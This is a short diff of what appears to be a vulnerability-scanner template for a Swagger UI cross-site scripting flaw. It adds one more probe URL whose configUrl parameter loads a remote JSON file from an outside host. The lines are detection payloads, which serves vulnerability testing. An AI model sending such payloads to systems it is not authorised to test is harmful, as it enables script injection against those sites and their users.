@@ -21,6 +21,7 @@ requests:
       - "{{BaseURL}}/api-doc?configUrl=https://xss.smarpo.com/test.json"
       - "{{BaseURL}}/api/swagger-ui.html?configUrl=https://xss.smarpo.com/test.json"
       - "{{BaseURL}}/swagger/ui/index.html?configUrl=https://xss.smarpo.com/test.json"      
+      - "{{BaseURL}}/swagger/ui/index?configUrl=https://xss.smarpo.com/test.json"      
       
     matchers:
       - type: word
